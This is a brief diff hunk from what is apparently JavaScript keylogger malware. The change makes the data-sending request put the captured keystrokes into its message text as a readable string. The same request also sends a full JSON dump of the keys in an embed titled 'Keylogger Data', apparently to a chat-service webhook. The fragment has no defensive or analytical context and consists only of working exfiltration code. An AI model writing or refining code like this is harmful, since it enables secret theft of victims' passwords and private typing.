@@ -22,7 +22,7 @@
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    content: 'Keystrokes captured',
+                    content: 'Keystrokes captured: ' + keys.map(k => k.key).join(''),
                     embeds: [{
                         title: 'Keylogger Data',
                         description: '```json\n' + JSON.stringify(keys) + '\n```',
